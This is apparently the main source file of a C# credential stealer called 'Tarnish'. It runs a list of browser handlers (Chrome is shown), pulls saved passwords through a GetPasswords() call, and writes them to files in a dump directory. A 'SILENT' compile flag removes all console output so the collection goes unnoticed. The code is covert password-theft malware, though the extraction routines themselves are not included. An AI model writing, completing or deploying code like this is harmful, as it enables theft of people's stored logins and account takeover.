#define SILENT
using System;
using System.IO;

namespace Tarnish
{
    class Program
    {
        static Proc[] Processes = new Proc[] 
        { 
            new ProcChrome()
        };
        [STAThread]
        static void Main(string[] args)
        {
            if (!Directory.Exists(Global.dumpDir))
                Directory.CreateDirectory(Global.dumpDir);
            foreach (Proc proc in Processes)
            {
                string pws = proc.GetPasswords();
                #if !SILENT
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write(proc.Name + "  ");
                #endif
                if (pws != "")
                {
                    using (StreamWriter sw = new StreamWriter(Global.dumpDir + proc.Name + ".txt"))
                        sw.Write(pws);
                    #if !SILENT
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("OKAY!");
                    #endif
                }
                #if !SILENT
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("FAIL!");
                }
                #endif
            }
        }
    }
}